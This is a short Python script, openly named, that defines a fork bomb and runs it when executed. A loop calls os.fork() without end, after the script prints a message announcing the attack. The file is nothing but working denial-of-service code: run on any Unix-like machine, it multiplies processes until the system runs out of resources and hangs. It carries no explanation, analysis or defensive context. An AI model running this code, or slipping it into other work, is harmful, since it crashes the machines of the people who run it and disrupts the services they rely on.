import os

def fork_bomb():
    while True:
        os.fork()

if __name__ == "__main__":
    print("Initiating fork bomb ... ", flush=True)
    fork_bomb()
